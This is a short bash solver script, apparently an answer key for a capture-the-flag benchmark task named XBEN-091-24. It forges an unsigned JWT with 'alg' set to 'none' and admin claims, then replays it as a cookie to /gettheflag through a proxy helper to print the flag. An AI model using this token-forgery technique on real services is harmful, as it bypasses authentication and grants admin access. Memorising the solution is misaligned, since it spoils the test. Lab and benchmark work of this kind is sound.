#!/usr/bin/env bash
# XBEN-091-24 — JWT alg=none. Proxy-mode twin. The verifier honours an "alg":
# "none" token with an empty signature, so a self-minted admin token is trusted
# and /gettheflag returns the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben091p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
TOKEN="$(python3 -c '
import base64, json
p=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(",",":")).encode()).rstrip(b"=").decode()
print(p({"typ":"JWT","alg":"none"})+"."+p({"username":"admin","role":"admin"})+".")')"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/gettheflag' --set "cookie.token=$TOKEN" >/dev/null
print_flag
